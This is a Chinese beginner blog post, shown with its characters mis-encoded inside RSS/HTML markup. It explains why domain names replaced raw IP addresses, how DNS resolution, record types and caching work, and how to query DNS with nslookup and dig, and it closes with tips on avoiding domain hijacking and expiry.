67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸŒ ä¸ºä»€ä¹ˆç½‘ç«™éœ€è¦"åŸŸå"ï¼Ÿâ€”â€”ä» IP åœ°å€åˆ°ç½‘å€çš„æ¼”è¿› ğŸ“</h2>
<blockquote>
<p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯æ— é™å¤§ï¼Œæ¬¢è¿æ”¶çœ‹åä¸‡ä¸ªä¸ºä»€ä¹ˆç³»åˆ—æ–‡ç« </p>
<p>å¸Œæœ›ä»Šå¤©çš„å†…å®¹èƒ½å¯¹å¤§å®¶æœ‰æ‰€å¸®åŠ©</p>
</blockquote>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œä½ å»ä¸€ä¸ªé™Œç”ŸåŸå¸‚æ‰¾æœ‹å‹ï¼š</p>
<ul>
<li>æœ‹å‹å‘Šè¯‰ä½ ï¼š"æˆ‘ä½åœ¨XXå¸‚XXåŒºXXè·¯XXå·XXå°åŒºXXæ ‹XXå•å…ƒXXå®¤"</li>
<li>æˆ–è€…æœ‹å‹å‘Šè¯‰ä½ ï¼š"æˆ‘ä½åœ¨'å¹¸ç¦å®¶å›­å°åŒº3æ ‹2å•å…ƒ501å®¤'"</li>
</ul>
<p>å“ªä¸ªæ›´å®¹æ˜“è®°ä½ï¼Ÿæ˜¾ç„¶æ˜¯åè€…ï¼ç”µè„‘è®¿é—®ç½‘ç«™ä¹Ÿé¢ä¸´åŒæ ·çš„é—®é¢˜â€”â€”IPåœ°å€å°±åƒä¸€é•¿ä¸²é—¨ç‰Œå·ï¼Œè€ŒåŸŸåå°±åƒä¸€ä¸ªå¥½è®°çš„å°åŒºåã€‚ä»Šå¤©å’±ä»¬å°±æ¥æ­å¼€åŸŸåçš„ç¥ç§˜é¢çº±ï¼</p>
<h3 data-id="heading-1">ğŸ“œ åŸŸåçš„"å‰ä¸–ä»Šç”Ÿ"ï¼šä»çº¯IPåˆ°ç½‘å€</h3>
<h4 data-id="heading-2">1. ğŸŒ ARPANETæ—¶ä»£ï¼šçº¯IPçš„"é»‘æš—æ—¶ä»£"</h4>
<p>1969å¹´ï¼Œäº’è”ç½‘çš„å‰èº«ARPANETè¯ç”Ÿäº†ã€‚é‚£æ—¶å€™ï¼Œç”µè„‘ä¹‹é—´é€šä¿¡åªèƒ½ç”¨IPåœ°å€â€”â€”ä¸€ä¸²æ¯ç‡¥çš„æ•°å­—ã€‚</p>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œé‚£æ—¶å€™è®¿é—®ç½‘ç«™çš„åœºæ™¯ï¼š</p>
<blockquote>
<p>"å˜¿ï¼Œæˆ‘å»ºäº†ä¸ªç½‘ç«™ï¼ŒIPæ˜¯10.0.0.1ï¼Œä½ è®°ä¸€ä¸‹ï¼Œæ˜å¤©è®¿é—®çœ‹çœ‹ï¼"
"å¥½çš„ï¼Œ10.0.0.1...ç­‰ç­‰ï¼Œæ˜¯10.0.0.1è¿˜æ˜¯10.0.1.0ï¼Ÿ"</p>
</blockquote>
<p>è¿™å°±åƒä½ ç»™æœ‹å‹æ‰“ç”µè¯ï¼Œå´è¦è®°ä½11ä½ç”µè¯å·ç ï¼Œè¿˜ä¸èƒ½å†™é”™ä¸€ä¸ªæ•°å­—ï¼ğŸ˜±</p>
<h4 data-id="heading-3">2. ğŸ§© DNSç³»ç»Ÿè¯ç”Ÿï¼šåŸŸåçš„"æ›™å…‰"</h4>
<p>1983å¹´ï¼Œä¿ç½—Â·è«å¡æ´¾ä¹”æ–¯ï¼ˆPaul Mockapetrisï¼‰å‘æ˜äº†DNSï¼ˆåŸŸåç³»ç»Ÿï¼‰ï¼Œè¿™æ˜¯äº’è”ç½‘å‘å±•å²ä¸Šçš„é‡Œç¨‹ç¢‘ï¼</p>
<p>DNSç³»ç»Ÿçš„ä½œç”¨å°±åƒä¸€æœ¬"äº’è”ç½‘ç”µè¯ç°¿"ï¼š</p>
<ul>
<li>ä½ è¾“å…¥åŸŸåï¼ˆgoogle.comï¼‰</li>
<li>DNSå¸®ä½ æŸ¥æ‰¾å¯¹åº”çš„IPåœ°å€ï¼ˆ142.250.74.142ï¼‰</li>
<li>æµè§ˆå™¨ç”¨IPåœ°å€è®¿é—®ç½‘ç«™</li>
</ul>
<p>è¿™å°±åƒä½ ç»™æœ‹å‹æ‰“ç”µè¯ï¼Œåªéœ€è¦æŒ‰åå­—æ‹¨å·ï¼Œä¸ç”¨è®°ç”µè¯å·ç ï¼ğŸ“</p>
<h4 data-id="heading-4">3. ğŸ’° åŸŸåå•†ä¸šåŒ–ï¼šä»å…è´¹åˆ°äº¿ä¸‡å¸‚åœº</h4>
<p>1985å¹´ï¼Œä¸–ç•Œä¸Šç¬¬ä¸€ä¸ª.comåŸŸå"symbolics.com"æ³¨å†ŒæˆåŠŸã€‚1993å¹´ï¼ŒNSIå…¬å¸è·å¾—äº†.comã€.netã€.orgåŸŸåçš„ç‹¬å®¶æ³¨å†Œæƒï¼Œå¼€å§‹å•†ä¸šåŒ–è¿è¥ã€‚</p>
<p>1998å¹´ï¼ŒICANNï¼ˆäº’è”ç½‘åç§°ä¸æ•°å­—åœ°å€åˆ†é…æœºæ„ï¼‰æˆç«‹ï¼ŒåŸŸåå¸‚åœºå¼€å§‹ç™¾èŠ±é½æ”¾ã€‚å¦‚ä»Šï¼Œå…¨çƒæœ‰<strong>3.5äº¿+æ³¨å†ŒåŸŸå</strong>ï¼Œæ¯å¤©DNSæŸ¥è¯¢é‡è¶…<strong>1ä¸‡äº¿æ¬¡</strong>ï¼</p>
<h3 data-id="heading-5">ğŸ”§ DNSå·¥ä½œåŸç†ï¼šä»åŸŸååˆ°IPçš„"ç¿»è¯‘å®˜"</h3>
<p>DNSç³»ç»Ÿå°±åƒä¸€ä¸ª"åˆ†å¸ƒå¼ç¿»è¯‘ç½‘ç»œ"ï¼Œç”±æ— æ•°å°åŸŸåæœåŠ¡å™¨ç»„æˆã€‚å½“ä½ è®¿é—®google.comæ—¶ï¼Œå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</p>
<h4 data-id="heading-6">1. ğŸ” DNSåˆ†å±‚è§£ææµç¨‹</h4>
<p>DNSè§£ææ˜¯ä¸€ä¸ª"ä»ä¸Šåˆ°ä¸‹"çš„æŸ¥è¯¢è¿‡ç¨‹ï¼š</p>
<ol>
<li><strong>æ ¹åŸŸåæœåŠ¡å™¨</strong>ï¼š"æˆ‘ä¸çŸ¥é“google.comçš„IPï¼Œä½†æˆ‘çŸ¥é“.comé¡¶çº§åŸŸåæœåŠ¡å™¨çš„åœ°å€ï¼"ğŸŒ</li>
<li><strong>é¡¶çº§åŸŸåæœåŠ¡å™¨</strong>ï¼š"æˆ‘ä¸çŸ¥é“google.comçš„IPï¼Œä½†æˆ‘çŸ¥é“google.comæƒå¨åŸŸåæœåŠ¡å™¨çš„åœ°å€ï¼"ğŸ¢</li>
<li><strong>æƒå¨åŸŸåæœåŠ¡å™¨</strong>ï¼š"google.comçš„IPæ˜¯142.250.74.142ï¼Œç»™ä½ ï¼"âœ…</li>
</ol>
<p>è¿™å°±åƒä½ æ‰¾æœ‹å‹ï¼š</p>
<ul>
<li>ä½ é—®å›½å®¶é‚®æ”¿æ€»å±€ï¼š"å¹¸ç¦å®¶å›­å°åŒºåœ¨å“ªï¼Ÿ"</li>
<li>é‚®æ”¿æ€»å±€ï¼š"åœ¨XXå¸‚ï¼Œä½ é—®XXå¸‚é‚®æ”¿å±€ï¼"</li>
<li>å¸‚é‚®æ”¿å±€ï¼š"åœ¨XXåŒºï¼Œä½ é—®XXåŒºé‚®æ”¿æ‰€ï¼"</li>
<li>åŒºé‚®æ”¿æ‰€ï¼š"å…·ä½“åœ°å€æ˜¯XXè·¯XXå·ï¼Œç»™ä½ ï¼"</li>
</ul>
<h4 data-id="heading-7">2. ğŸ“‹ DNSè®°å½•ç±»å‹</h4>
<p>DNSæœåŠ¡å™¨å­˜å‚¨äº†å¤šç§ç±»å‹çš„è®°å½•ï¼Œå¸¸è§çš„æœ‰ï¼š</p>



































<table><thead><tr><th>è®°å½•ç±»å‹</th><th>ä½œç”¨</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>A</td><td>å°†åŸŸåè§£æä¸ºIPv4åœ°å€</td><td>google.com â†’ 142.250.74.142</td></tr><tr><td>AAAA</td><td>å°†åŸŸåè§£æä¸ºIPv6åœ°å€</td><td>google.com â†’ 2607:f8b0:4005:804::200e</td></tr><tr><td>CNAME</td><td>åŸŸååˆ«å</td><td><a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.google.com" target="_blank" title="http://www.google.com" ref="nofollow noopener noreferrer">www.google.com</a> â†’ google.com</td></tr><tr><td>MX</td><td>é‚®ä»¶æœåŠ¡å™¨</td><td>gmail.com â†’ mx.google.com</td></tr><tr><td>NS</td><td>åŸŸåæœåŠ¡å™¨</td><td>google.com â†’ ns1.google.com</td></tr></tbody></table>
<h4 data-id="heading-8">3. ğŸ’¾ ç¼“å­˜æœºåˆ¶ï¼šåŠ é€ŸDNSæŸ¥è¯¢</h4>
<p>ä¸ºäº†æé«˜æŸ¥è¯¢é€Ÿåº¦ï¼ŒDNSç³»ç»Ÿæœ‰å¼ºå¤§çš„ç¼“å­˜æœºåˆ¶ï¼š</p>
<ul>
<li>ä½ çš„ç”µè„‘ä¼šç¼“å­˜æœ€è¿‘æŸ¥è¯¢è¿‡çš„åŸŸå</li>
<li>ä½ çš„ISPï¼ˆç½‘ç»œæœåŠ¡å•†ï¼‰ä¹Ÿæœ‰DNSç¼“å­˜</li>
<li>å„çº§åŸŸåæœåŠ¡å™¨ä¹Ÿä¼šç¼“å­˜ç»“æœ</li>
</ul>
<p>è¿™å°±åƒä½ è®°ä½äº†æœ‹å‹çš„ç”µè¯å·ç ï¼Œä¸‹æ¬¡æ‰“ç”µè¯å°±ä¸ç”¨æŸ¥é€šè®¯å½•äº†ï¼ğŸ’¡</p>
<h3 data-id="heading-9">ğŸ“Š è¶£å‘³å¯¹æ¯”ï¼šè®°IP vs è®°åŸŸå</h3>
<p>å’±ä»¬æ¥åšä¸ªå°æµ‹éªŒï¼Œçœ‹çœ‹ä½ èƒ½è®°ä½å¤šå°‘ï¼š</p>








































<table><thead><tr><th>ç±»å‹</th><th>å†…å®¹</th><th>ä½ èƒ½è®°ä½å—ï¼Ÿ</th></tr></thead><tbody><tr><td>IPåœ°å€</td><td>142.250.74.142</td><td>ğŸ˜µâ€ğŸ’« å¾ˆéš¾</td></tr><tr><td>åŸŸå</td><td>google.com</td><td>ğŸ˜ è½»æ¾</td></tr><tr><td>IPåœ°å€</td><td>202.108.22.5</td><td>ğŸ˜µâ€ğŸ’« å¾ˆéš¾</td></tr><tr><td>åŸŸå</td><td>baidu.com</td><td>ğŸ˜ è½»æ¾</td></tr><tr><td>IPåœ°å€</td><td>31.13.81.36</td><td>ğŸ˜µâ€ğŸ’« å¾ˆéš¾</td></tr><tr><td>åŸŸå</td><td>facebook.com</td><td>ğŸ˜ è½»æ¾</td></tr></tbody></table>
<p>ç»“æœå¾ˆæ˜æ˜¾ï¼š<strong>è®°åŸŸåæ¯”è®°IPåœ°å€å®¹æ˜“1000å€ï¼</strong></p>
<h3 data-id="heading-10">ğŸ’» ä»£ç å®ä¾‹ï¼šæ‰‹åŠ¨æŸ¥è¯¢DNSè®°å½•</h3>
<p>å’±ä»¬æ¥ç”¨å‘½ä»¤è¡Œå·¥å…·<code>nslookup</code>å’Œ<code>dig</code>æ‰‹åŠ¨æŸ¥è¯¢DNSè®°å½•ï¼Œçœ‹çœ‹DNSæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼</p>
<h4 data-id="heading-11">1. ä½¿ç”¨nslookupæŸ¥è¯¢</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥è¯¢google.comçš„Aè®°å½•</span>
nslookup google.com

<span class="hljs-comment"># è¾“å‡ºç¤ºä¾‹ï¼š</span>
Server:  dns.google
Address:  8.8.8.8

Non-authoritative answer:
Name:    google.com
Address:  142.250.74.142

<span class="hljs-comment"># æŸ¥è¯¢google.comçš„AAAAè®°å½•ï¼ˆIPv6ï¼‰</span>
nslookup -<span class="hljs-built_in">type</span>=AAAA google.com

<span class="hljs-comment"># æŸ¥è¯¢google.comçš„MXè®°å½•ï¼ˆé‚®ä»¶æœåŠ¡å™¨ï¼‰</span>
nslookup -<span class="hljs-built_in">type</span>=MX google.com
</code></pre>
<h4 data-id="heading-12">2. ä½¿ç”¨digæŸ¥è¯¢ï¼ˆæ›´è¯¦ç»†ï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># è¯¦ç»†æŸ¥è¯¢google.comçš„DNSè®°å½•</span>
dig google.com +trace

<span class="hljs-comment"># è¾“å‡ºç¤ºä¾‹ï¼ˆç®€åŒ–ï¼‰ï¼š</span>
; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; google.com +trace
;; global options: +cmd
.                       518400  IN      NS      a.root-servers.net.
.                       518400  IN      NS      b.root-servers.net.
<span class="hljs-comment"># ... æ ¹æœåŠ¡å™¨ä¿¡æ¯ ...</span>
com.                    172800  IN      NS      a.gtld-servers.net.
<span class="hljs-comment"># ... é¡¶çº§åŸŸåæœåŠ¡å™¨ä¿¡æ¯ ...</span>
google.com.             172800  IN      NS      ns1.google.com.
google.com.             300     IN      A       142.250.74.142
</code></pre>
<h3 data-id="heading-13">ğŸ¯ åŸŸåçš„"ä¸ƒåäºŒå˜"ï¼šä¸åŒç±»å‹çš„åŸŸå</h3>
<p>åŸŸåå°±åƒ"äº’è”ç½‘ä¸Šçš„èº«ä»½è¯"ï¼Œæœ‰ä¸åŒçš„ç±»å‹ï¼š</p>
<h4 data-id="heading-14">1. ğŸ” é¡¶çº§åŸŸåï¼ˆTLDï¼‰</h4>
<ul>
<li><strong>é€šç”¨é¡¶çº§åŸŸå</strong>ï¼š.comï¼ˆå•†ä¸šï¼‰ã€.netï¼ˆç½‘ç»œï¼‰ã€.orgï¼ˆç»„ç»‡ï¼‰</li>
<li><strong>å›½å®¶é¡¶çº§åŸŸå</strong>ï¼š.cnï¼ˆä¸­å›½ï¼‰ã€.usï¼ˆç¾å›½ï¼‰ã€.ukï¼ˆè‹±å›½ï¼‰</li>
<li><strong>æ–°é¡¶çº§åŸŸå</strong>ï¼š.xyzã€.techã€.blogã€.shop</li>
</ul>
<h4 data-id="heading-15">2. ğŸ¢ äºŒçº§åŸŸå</h4>
<p>åœ¨é¡¶çº§åŸŸåå‰åŠ ä¸Šå‰ç¼€ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>baidu.comï¼ˆbaiduæ˜¯äºŒçº§åŸŸåï¼Œ.comæ˜¯é¡¶çº§åŸŸåï¼‰</li>
<li>github.comï¼ˆgithubæ˜¯äºŒçº§åŸŸåï¼Œ.comæ˜¯é¡¶çº§åŸŸåï¼‰</li>
</ul>
<h4 data-id="heading-16">3. ğŸŒ ä¸‰çº§åŸŸå</h4>
<p>åœ¨äºŒçº§åŸŸåå‰åŠ ä¸Šå‰ç¼€ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.baidu.com%25EF%25BC%2588www%25E6%2598%25AF%25E4%25B8%2589%25E7%25BA%25A7%25E5%259F%259F%25E5%2590%258D%25EF%25BC%2589" target="_blank" title="http://www.baidu.com%EF%BC%88www%E6%98%AF%E4%B8%89%E7%BA%A7%E5%9F%9F%E5%90%8D%EF%BC%89" ref="nofollow noopener noreferrer">www.baidu.comï¼ˆwwwæ˜¯ä¸‰çº§åŸŸåï¼‰</a></li>
<li>mail.google.comï¼ˆmailæ˜¯ä¸‰çº§åŸŸåï¼‰</li>
</ul>
<h4 data-id="heading-17">4. ğŸ”¢ IPv6åŸŸå</h4>
<p>ä¸ºäº†é€‚åº”IPv6åœ°å€ï¼Œè¿˜æœ‰ç‰¹æ®Šçš„åŸŸåæ ¼å¼ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>[2001:db8::1]ï¼ˆç›´æ¥åœ¨URLä¸­ä½¿ç”¨IPv6åœ°å€ï¼‰</li>
</ul>
<h3 data-id="heading-18">ğŸ¨ åŸŸåçš„"è‰ºæœ¯"ï¼šå¥½åŸŸåçš„æ ‡å‡†</h3>
<p>ä¸€ä¸ªå¥½çš„åŸŸåå°±åƒä¸€ä¸ªå¥½çš„å“ç‰Œåï¼Œå®¹æ˜“è®°ã€æœ‰æ„ä¹‰ã€‚åˆ¤æ–­ä¸€ä¸ªåŸŸåå¥½ä¸å¥½ï¼Œçœ‹è¿™å‡ ç‚¹ï¼š</p>






























<table><thead><tr><th>æ ‡å‡†</th><th>å¥½åŸŸåç¤ºä¾‹</th><th>å·®åŸŸåç¤ºä¾‹</th></tr></thead><tbody><tr><td>ç®€çŸ­æ˜“è®°</td><td>google.com</td><td>thisisareallylongdomainname.com</td></tr><tr><td>æœ‰æ„ä¹‰</td><td>taobao.comï¼ˆæ·˜å®ï¼‰</td><td>xyz123.com</td></tr><tr><td>æ— ç‰¹æ®Šå­—ç¬¦</td><td>baidu.com</td><td>my-site.comï¼ˆå«è¿å­—ç¬¦ï¼‰</td></tr><tr><td>åç¼€åˆé€‚</td><td>techcrunch.comï¼ˆ.comé€‚åˆç§‘æŠ€åª’ä½“ï¼‰</td><td>techcrunch.orgï¼ˆ.orgé€‚åˆéè¥åˆ©ç»„ç»‡ï¼‰</td></tr></tbody></table>
<h3 data-id="heading-19">âš ï¸ åŸŸåçš„"é™·é˜±"ï¼šå¸¸è§é—®é¢˜</h3>
<h4 data-id="heading-20">1. ğŸ”’ åŸŸååŠ«æŒ</h4>
<p>åŸŸååŠ«æŒæ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡å„ç§æ‰‹æ®µè·å–åŸŸåçš„æ§åˆ¶æƒï¼Œç„¶åå°†åŸŸåæŒ‡å‘æ¶æ„ç½‘ç«™ã€‚</p>
<p><strong>é¢„é˜²æ–¹æ³•</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨å¼ºå¯†ç ä¿æŠ¤åŸŸåè´¦å·</li>
<li>å¼€å¯åŒå› ç´ è®¤è¯</li>
<li>å®šæœŸæ£€æŸ¥åŸŸåè§£æè®°å½•</li>
</ul>
<h4 data-id="heading-21">2. â³ åŸŸåè¿‡æœŸ</h4>
<p>å¾ˆå¤šäººå› ä¸ºå¿˜è®°ç»­è´¹ï¼Œå¯¼è‡´åŸŸåè¿‡æœŸè¢«æŠ¢æ³¨ã€‚</p>
<p><strong>é¢„é˜²æ–¹æ³•</strong>ï¼š</p>
<ul>
<li>è®¾ç½®è‡ªåŠ¨ç»­è´¹</li>
<li>æå‰30å¤©ç»­è´¹</li>
<li>å¼€å¯åˆ°æœŸæé†’</li>
</ul>
<h4 data-id="heading-22">3. ğŸ·ï¸ åŸŸåäº‰è®®</h4>
<p>å¦‚æœä½ çš„åŸŸåå’Œåˆ«äººçš„å“ç‰Œåç›¸ä¼¼ï¼Œå¯èƒ½ä¼šå¼•å‘äº‰è®®ã€‚</p>
<p><strong>é¢„é˜²æ–¹æ³•</strong>ï¼š</p>
<ul>
<li>ä¸è¦æ³¨å†ŒçŸ¥åå“ç‰Œçš„ç›¸ä¼¼åŸŸå</li>
<li>æ³¨å†Œç›¸å…³åç¼€çš„åŸŸåï¼ˆ.comã€.cnã€.netç­‰ï¼‰</li>
</ul>
<h3 data-id="heading-23">ğŸ”® åŸŸåçš„"æœªæ¥"ï¼šä»IPv6åˆ°åŒºå—é“¾</h3>
<h4 data-id="heading-24">1. ğŸš€ IPv6æ—¶ä»£çš„åŸŸå</h4>
<p>éšç€IPv6çš„æ™®åŠï¼ŒåŸŸåç³»ç»Ÿä¹Ÿåœ¨å‡çº§ã€‚IPv6åœ°å€æ›´é•¿ï¼ˆ128ä½ï¼‰ï¼Œä½†DNSç³»ç»Ÿå¯ä»¥è½»æ¾å¤„ç†ã€‚</p>
<h4 data-id="heading-25">2. â›“ï¸ åŒºå—é“¾åŸŸå</h4>
<p>åŒºå—é“¾åŸŸåæ˜¯åŸºäºåŒºå—é“¾æŠ€æœ¯çš„å»ä¸­å¿ƒåŒ–åŸŸåï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>.ethï¼ˆä»¥å¤ªåŠåŸŸåï¼‰</li>
<li>.cryptoï¼ˆåŒºå—é“¾åŸŸåï¼‰</li>
</ul>
<p>åŒºå—é“¾åŸŸåçš„ä¼˜åŠ¿æ˜¯ï¼š</p>
<ul>
<li>å»ä¸­å¿ƒåŒ–ï¼Œæ— éœ€æ³¨å†Œå•†</li>
<li>æ”¯æŒåŠ å¯†è´§å¸æ”¯ä»˜</li>
<li>æ°¸ä¹…æ‹¥æœ‰ï¼Œä¸ä¼šè¿‡æœŸ</li>
</ul>
<h4 data-id="heading-26">3. ğŸ¤– AIä¸åŸŸå</h4>
<p>æœªæ¥ï¼ŒAIå¯èƒ½ä¼šæ”¹å˜åŸŸåçš„ä½¿ç”¨æ–¹å¼ï¼š</p>
<ul>
<li>è¯­éŸ³åŸŸåï¼šç›´æ¥é€šè¿‡è¯­éŸ³è®¿é—®ç½‘ç«™</li>
<li>æ™ºèƒ½è§£æï¼šæ ¹æ®ç”¨æˆ·ä½ç½®è‡ªåŠ¨é€‰æ‹©æœ€å¿«çš„æœåŠ¡å™¨</li>
<li>ä¸ªæ€§åŒ–åŸŸåï¼šæ ¹æ®ç”¨æˆ·å…´è¶£æ¨èç›¸å…³ç½‘ç«™</li>
</ul>
<h3 data-id="heading-27">ğŸ“ äº’åŠ¨å°æµ‹éªŒï¼šä½ ç­”å¯¹äº†å—ï¼Ÿ</h3>
<p>æ¥æµ‹è¯•ä¸€ä¸‹ä½ å¯¹åŸŸåçš„äº†è§£ï¼š</p>



































<table><thead><tr><th>é—®é¢˜</th><th>ç­”æ¡ˆ</th><th>ä½ ç­”å¯¹äº†å—ï¼Ÿ</th></tr></thead><tbody><tr><td>ä¸–ç•Œä¸Šç¬¬ä¸€ä¸ª.comåŸŸåæ˜¯ä»€ä¹ˆï¼Ÿ</td><td>symbolics.com</td><td>âœ…/âŒ</td></tr><tr><td>DNSçš„ä¸­æ–‡å…¨ç§°æ˜¯ä»€ä¹ˆï¼Ÿ</td><td>åŸŸåç³»ç»Ÿ</td><td>âœ…/âŒ</td></tr><tr><td>å…¨çƒæ³¨å†ŒåŸŸåæ•°é‡çº¦ä¸ºå¤šå°‘ï¼Ÿ</td><td>3.5äº¿+</td><td>âœ…/âŒ</td></tr><tr><td>æ¯å¤©DNSæŸ¥è¯¢é‡çº¦ä¸ºå¤šå°‘ï¼Ÿ</td><td>1ä¸‡äº¿æ¬¡+</td><td>âœ…/âŒ</td></tr><tr><td>.comåŸŸåæ˜¯å“ªä¸€å¹´å¼€å§‹å•†ä¸šåŒ–çš„ï¼Ÿ</td><td>1993å¹´</td><td>âœ…/âŒ</td></tr></tbody></table>
<h3 data-id="heading-28">ğŸ¯ ç»“è¯­ï¼šåŸŸåçš„"æ™ºæ…§"</h3>
<p>åŸŸåçš„å‘æ˜ï¼Œæ˜¯äº’è”ç½‘ä»"æŠ€æœ¯é©±åŠ¨"åˆ°"ç”¨æˆ·å‹å¥½"çš„é‡è¦è½¬å˜ã€‚å®ƒè®©äº’è”ç½‘ä»å°‘æ•°æŠ€æœ¯ä¸“å®¶çš„å·¥å…·ï¼Œå˜æˆäº†æ™®é€šäººéƒ½èƒ½ä½¿ç”¨çš„å¹³å°ã€‚</p>
<p>ä¸‹æ¬¡å½“ä½ åœ¨æµè§ˆå™¨ä¸­è¾“å…¥åŸŸåè®¿é—®ç½‘ç«™æ—¶ï¼Œä¸å¦¨æƒ³ä¸€æƒ³ï¼šåœ¨è¿™èƒŒåï¼Œæœ‰ä¸€ä¸ªåºå¤§çš„DNSç³»ç»Ÿæ­£åœ¨ä¸ºä½ æœåŠ¡ï¼ŒæŠŠå¤æ‚çš„IPåœ°å€å˜æˆäº†ç®€å•æ˜“è®°çš„åŸŸåã€‚</p>
<p>åŸŸåå°±åƒäº’è”ç½‘çš„"é—¨é¢"ï¼Œå®ƒä¸ä»…æ˜¯ä¸€ä¸²å­—ç¬¦ï¼Œæ›´æ˜¯å“ç‰Œçš„è±¡å¾ã€ç”¨æˆ·çš„å…¥å£ã€‚ä¸€ä¸ªå¥½çš„åŸŸåï¼Œèƒ½è®©ä½ çš„ç½‘ç«™åœ¨æµ©ç€šçš„äº’è”ç½‘ä¸­è„±é¢–è€Œå‡ºï¼</p>
<hr/>
<h3 data-id="heading-29">ğŸ’¬ äº’åŠ¨è¯é¢˜</h3>
<ol>
<li>ä½ çŸ¥é“å“ªäº›æœ‰è¶£çš„åŸŸåï¼Ÿ</li>
<li>ä½ æœ‰è‡ªå·±çš„åŸŸåå—ï¼Ÿä¸ºä»€ä¹ˆæ³¨å†Œå®ƒï¼Ÿ</li>
<li>ä½ è§‰å¾—æœªæ¥åŸŸåä¼šè¢«ä»€ä¹ˆå–ä»£å—ï¼Ÿ</li>
</ol>
<p>å¿«æ¥è¯„è®ºåŒºèŠèŠä½ çš„æƒ³æ³•ï¼ğŸ’¬ ç‚¹èµæ”¶è—ä¸è¿·è·¯ï¼Œå’±ä»¬ä¸‹æœŸç»§ç»­æ¢ç´¢è®¡ç®—æœºçš„"åä¸‡ä¸ªä¸ºä»€ä¹ˆ"ï¼ğŸ‰</p>
<p><strong>å…³æ³¨æˆ‘</strong>ï¼Œä¸‹æœŸå¸¦ä½ è§£é”æ›´å¤šè®¡ç®—æœºçš„"å¥‡è‘©å†·çŸ¥è¯†"ï¼ğŸ¤“</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[8 ä¸ªæ”¯æŒä¸€é”®å¯¼å…¥ TRAE ä½¿ç”¨çš„è‡ªå®šä¹‰æ™ºèƒ½ä½“]]></title>    <link>https://juejin.cn/post/7583983152324378650</link>    <guid>https://juejin.cn/post/7583983152324378650</guid>    <pubDate>2025-12-16T05:33:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583983152324378650" data-draft-id="7583969283790274614" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="8 ä¸ªæ”¯æŒä¸€é”®å¯¼å…¥ TRAE ä½¿ç”¨çš„è‡ªå®šä¹‰æ™ºèƒ½ä½“"/> <meta itemprop="keywords" content="Trae"/> <meta itemprop="datePublished" 